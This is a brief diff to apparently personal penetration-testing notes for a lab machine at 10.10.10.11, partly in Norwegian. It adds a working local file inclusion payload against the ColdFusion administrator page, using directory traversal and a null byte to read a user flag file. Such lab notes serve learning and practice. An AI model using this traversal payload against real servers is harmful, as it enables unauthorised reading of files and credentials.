@@ -96,3 +96,7 @@ kanskje applocker er enablet?
 
 
 
+LFI?
+
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../Users/Tolis/Desktop/user.txt%00en
+
